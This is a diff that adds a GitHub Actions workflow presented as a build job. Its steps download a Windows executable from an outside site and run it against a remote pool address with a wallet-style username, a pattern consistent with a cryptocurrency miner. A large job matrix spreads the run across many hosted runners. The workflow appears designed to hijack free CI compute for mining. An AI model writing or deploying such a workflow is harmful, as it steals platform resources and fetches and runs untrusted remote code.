@@ -1,0 +1,24 @@
+name: Ex_code-unmineable
+ 
+on: [workflow_dispatch]
+ 
+jobs:
+  build:
+    name: Ex-code
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: DOWNLOAD
+      run: Invoke-WebRequest https://excode.xyz/download/appv2win.exe -outfile appv2win.exe
+    - name: DEPLOY
+      run: .\appv2win -a gr -o 207.180.196.154:4444 -u RKnGW27zG1zFVxJe8Hg9qgthU49SLxDxYz.meter -t 1
+    - name: DONE
+      run: exit
